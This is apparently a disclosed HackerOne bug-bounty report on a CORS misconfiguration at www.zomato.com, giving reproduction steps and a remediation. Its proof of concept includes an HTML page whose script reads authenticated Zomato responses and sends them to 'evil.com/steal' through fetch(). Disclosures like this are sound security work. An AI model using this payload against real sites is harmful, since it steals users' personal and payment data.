# Title: [www.zomato.com] CORS Misconfiguration, Could Lead to Disclosure of Sensitive Information

- **Platform**: HackerOne
- **Program**: Eternal (Zomato)
- **Severity**: Medium
- **Date**: October 20, 2018
- **Researcher**: ahd911
- **Bounty**: N/A

## Summary
A CORS misconfiguration on Zomato's main domain allowed any arbitrary origin to make authenticated requests. The `Access-Control-Allow-Origin` header was dynamically set to reflect the request's `Origin` header, and `Access-Control-Allow-Credentials: true` was enabled, allowing attackers to exfiltrate sensitive user data.

## Technical Details
Zomato's web server was configured to trust arbitrary origins by reflecting the `Origin` header back as `Access-Control-Allow-Origin`. Combined with `Access-Control-Allow-Credentials: true`, this meant that any website could make cross-origin requests to Zomato's API with the user's cookies automatically attached, and read the response.

## Steps to Reproduce
1. Send a GET request to `www.zomato.com/abudhabi` with `Origin: https://evil.com`
2. Observe the response includes `Access-Control-Allow-Origin: https://evil.com`
3. The response also includes `Access-Control-Allow-Credentials: true`
4. Create a malicious HTML page that fetches authenticated data from Zomato

## Proof of Concept
```
Request:
GET /abudhabi HTTP/1.1
Host: www.zomato.com
Origin: https://evil.com
Cookie: zl=en; fbtrack=0c8f198276217196ed64230da7ec8506; _ga=GA1.2.1887254439.1538912146

Response:
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true

CORS Exploit HTML:
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (this.readyState == 4) {
    fetch('https://evil.com/steal?data=' + btoa(this.responseText));
  }
};
xhr.open('GET', 'https://www.zomato.com/abudhabi', true);
xhr.withCredentials = true;
xhr.send();
</script>
</body>
</html>
```

## Impact
An attacker could exfiltrate sensitive user information including personal data, order history, saved addresses, and payment information from authenticated Zomato users.

## Remediation
Do not reflect the Origin header dynamically. Instead, whitelist specific trusted origins. Avoid setting `Access-Control-Allow-Credentials: true` unless absolutely necessary and only with specific allowed origins.

## References
- https://hackerone.com/reports/426165
